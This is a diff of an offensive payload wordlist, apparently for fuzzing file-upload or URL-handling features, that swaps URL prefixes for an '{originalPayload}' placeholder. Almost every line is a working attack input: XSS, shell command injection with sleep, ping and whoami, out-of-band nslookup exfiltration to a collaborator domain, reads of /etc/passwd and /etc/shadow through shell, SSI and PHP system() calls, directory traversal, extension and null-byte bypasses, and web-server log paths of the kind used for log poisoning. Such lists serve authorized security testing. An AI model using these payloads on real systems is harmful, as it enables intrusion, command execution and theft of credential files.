@@ -1,61 +1,39 @@
--- -----------
--- JS payloads
--- ------------
-https://{domain}/{fileName}.png<svg onload=alert(document.domain)>
-https://{domain}/{fileName}<svg onload=alert(document.domain)>
-
--- ------------
--- XSS payloads
--- ------------
-
-
--- ------------
--- CMD payloads
--- ------------
-https://{domain}/{fileName};.png
-https://{domain}/{fileName};.jpg
-https://{domain}/{fileName}.png;sleep(10)-- -.jpg
-https://{domain}/{fileName}.png;sleep(10)--%20-.jpg
-https://{domain}/{fileName}.jpg; sleep 10;
-https://{domain}/{fileName}.png; sleep 10;
-https://{domain}/{fileName}.jpg;%20sleep%2010;
-https://{domain}/{fileName}.png;%20sleep%2010;
-https://{domain}/{fileName};sleep 10;
-https://{domain}/{fileName};%20sleep%2010;
-https://{domain}/{fileName}.png||ping+-c+10+127.0.0.1||
-https://{domain}/{fileName}.png||whoami>/var/www/images/output.txt||
-https://{domain}/{fileName}.png||nslookup+'whoami'.{CollaboratorDomain}
-https://{domain}/{fileName}.png||nslookup+'whoami'.{CollaboratorDomain}||.png
-https://{domain}/{fileName}.png?a=bbb||ping+-c+10+127.0.0.1||
-https://{domain}/{fileName}.png?a=bbb; sleep 10;
-https://{domain}/{fileName}.png?a=bbb;%20sleep%2010;
+{originalPayload}<svg onload=alert(document.domain)>
+{originalPayload}<svg onload=alert(document.domain)>
+{originalPayload};.png
+{originalPayload};.jpg
+{originalPayload}.png;sleep(10)-- -.jpg
+{originalPayload}.png;sleep(10)--%20-.jpg
+{originalPayload}.jpg; sleep 10;
+{originalPayload}.png; sleep 10;
+{originalPayload}.jpg;%20sleep%2010;
+{originalPayload}.png;%20sleep%2010;
+{originalPayload};sleep 10;
+{originalPayload};%20sleep%2010;
+{originalPayload}.png||ping+-c+10+127.0.0.1||
+{originalPayload}.png||ping+-c+10+localhost||
+{originalPayload}.png||whoami>/var/www/images/output.txt||
+{originalPayload}.png||nslookup+'whoami'.{collaboratorDomain}
+{originalPayload}.png||nslookup+'whoami'.{collaboratorDomain}||.png
+{originalPayload}.png?a=bbb||ping+-c+10+127.0.0.1||
+{originalPayload}.png?a=bbb||ping+-c+10+localhost||
+{originalPayload}.png?a=bbb; sleep 10;
+{originalPayload}.png?a=bbb;%20sleep%2010;
 https://sleep(10)-- -.jpg
 
-
-https://{domain}/{fileName}.png;cat /etc/hosts
-https://{domain}/{fileName}.png;$(`cat /etc/passwd`)
-https://{domain}/{fileName}.png;cat /etc/passwd
-https://{domain}/{fileName}.png;%0Acat%20/etc/passwd
-https://{domain}/{fileName}.png;{{ get_user_file("/etc/passwd") }}
-https://{domain}/{fileName}.png;<!--#exec cmd="/bin/cat /etc/passwd"-->
-https://{domain}/{fileName}.png;<!--#exec cmd="/bin/cat /etc/shadow"-->
-https://{domain}/{fileName}.png;<!--#exec cmd="/usr/bin/id;-->
-https://{domain}/{fileName}.png;system('cat /etc/passwd');
-https://{domain}/{fileName}.png;<?php system("cat /etc/passwd");?>
-https://{domain}/{fileName}.png;system('cat%20/etc/passwd')
-https://{domain}/{fileName}.png;system('id')
-https://{domain}/{fileName}.png;system('/usr/bin/id')
-
-
-
-
--- --------------
--- xpath payloads
--- --------------
-
--- ------------
--- sql payloads
--- ------------
+{originalPayload}.png;cat /etc/hosts
+{originalPayload}.png;$(`cat /etc/passwd`)
+{originalPayload}.png;cat /etc/passwd
+{originalPayload}.png;%0Acat%20/etc/passwd
+{originalPayload}.png;{{ get_user_file("/etc/passwd") }}
+{originalPayload}.png;<!--#exec cmd="/bin/cat /etc/passwd"-->
+{originalPayload}.png;<!--#exec cmd="/bin/cat /etc/shadow"-->
+{originalPayload}.png;<!--#exec cmd="/usr/bin/id;-->
+{originalPayload}.png;system('cat /etc/passwd');
+{originalPayload}.png;<?php system("cat /etc/passwd");?>
+{originalPayload}.png;system('cat%20/etc/passwd')
+{originalPayload}.png;system('id')
+{originalPayload}.png;system('/usr/bin/id')
 
 -- ------------------
 -- localhost payloads
@@ -77,8 +55,8 @@ file://etc/passwd
 -- ----------------------------
 -- directory traversal payloads
 -- ----------------------------
-https://{domain}/{fileName}../../../tmp/lol.png
-https://{domain}/{fileName}/../../../tmp/lol.png
+{originalPayload}../../../tmp/lol.png
+{originalPayload}/../../../tmp/lol.png
 https://…:.jpg
 https://…:.png
 
@@ -86,34 +64,34 @@ https://…:.png
 -- -----------------------------
 -- uncommon file extension types
 -- -----------------------------
-https://{domain}/{fileName}.png.php
-https://{domain}/{fileName}.png.Php5
-https://{domain}/{fileName}.png%20
-https://{domain}/{fileName}.png%0a
-https://{domain}/{fileName}.png%00
-https://{domain}/{fileName}.png%0d%0a
-https://{domain}/{fileName}.png/
-https://{domain}/{fileName}.png.\
-https://{domain}/{fileName}.
-https://{domain}/{fileName}.png....
-https://{domain}/{fileName}.png....
-https://{domain}/{fileName}.png
-https://{domain}/{fileName}.png.png
-https://{domain}/{fileName}.png.png.png
-https://{domain}/{fileName}.jpg
-https://{domain}/{fileName}.jpg.jpg
-https://{domain}/{fileName}.jpg.jpg.jpg
-https://{domain}/{fileName}.png.pHp5
-https://{domain}/{fileName}.png\x00.png
-https://{domain}/{fileName}.png%0a.png
-https://{domain}/{fileName}.png%0d%0a.png
-https://{domain}/{fileName}.phpJunk123png
+{originalPayload}.png.php
+{originalPayload}.png.Php5
+{originalPayload}.png%20
+{originalPayload}.png%0a
+{originalPayload}.png%00
+{originalPayload}.png%0d%0a
+{originalPayload}.png/
+{originalPayload}.png.\
+{originalPayload}.
+{originalPayload}.png....
+{originalPayload}.png....
+{originalPayload}.png
+{originalPayload}.png.png
+{originalPayload}.png.png.png
+{originalPayload}.jpg
+{originalPayload}.jpg.jpg
+{originalPayload}.jpg.jpg.jpg
+{originalPayload}.png.pHp5
+{originalPayload}.png\x00.png
+{originalPayload}.png%0a.png
+{originalPayload}.png%0d%0a.png
+{originalPayload}.phpJunk123png
 
 -- ------------------
 -- null byte payloads
 -- ------------------
-https://{domain}/{fileName}.jpg%00.png
-https://{domain}/{fileName}.jpg%0delete0.png
+{originalPayload}.jpg%00.png
+{originalPayload}.jpg%0delete0.png
 
 -- -------------------------
 -- Double-extension payloads
@@ -123,13 +101,34 @@ https://{domain}/{fileName}.jpg%0delete0.png
 -- Special character payloads
 -- --------------------------
 https://{domain}/|{fileName}.jpg
-https://{domain}/{fileName}.jpg
+{originalPayload}.jpg
 https://{domain}/>{fileName}.jpg
 https://{domain}/*{fileName}.jpg
 https://{domain}/?{fileName}.jpg
 https://{domain}/"{fileName}.jpg
 
 
-
+-- ------------------
 -- Long file payloads
 https://{domain}/"{fileName}eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee.jpg
+-- ------------------
+-- --------------
+-- xpath payloads
+-- --------------
+
+-- ------------
+-- sql payloads
+-- ------------
+
+-- ---------------
+-- Apache exploits
+-- ---------------
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/apache2/error.log
+/var/log/apache/error.log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/error_log
